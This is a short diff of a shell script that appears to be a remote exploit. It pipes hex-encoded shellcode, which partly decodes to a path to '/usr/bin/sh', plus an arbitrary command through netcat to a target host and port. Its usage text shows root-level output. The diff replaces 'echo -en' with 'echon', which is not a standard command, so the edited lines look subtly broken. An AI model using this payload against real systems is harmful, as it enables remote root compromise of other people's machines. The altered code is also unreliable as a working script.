@@ -24,7 +24,7 @@
 # 
 #
 
-[ $# -lt 3 ] && echo -en "Syntax: `basename ${0}` <host> <port> <commands>\n\n`basename ${0}` 10.22.33.44 5555 id \nX15 [12:1] uid=0(root) gid=0(root)
+[ $# -lt 3 ] && echon "Syntax: `basename ${0}` <host> <port> <commands>\n\n`basename ${0}` 10.22.33.44 5555 id \nX15 [12:1] uid=0(root) gid=0(root)
 " && exit 0
 
 HOST=`echo ${@} | awk '{print $1}'`
@@ -43,4 +43,4 @@ SC=${SC}"\x2e\x2f\x2e\x2e\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x73\x68\x00"
 SC=${SC}"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 SC=${SC}"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 SHELLCODE=${SC}
-( echo -en ${SHELLCODE} ; echo ${CMD} ) | nc -w1 ${HOST} ${PORT}
+( echon ${SHELLCODE} ; echo ${CMD} ) | nc -w1 ${HOST} ${PORT}
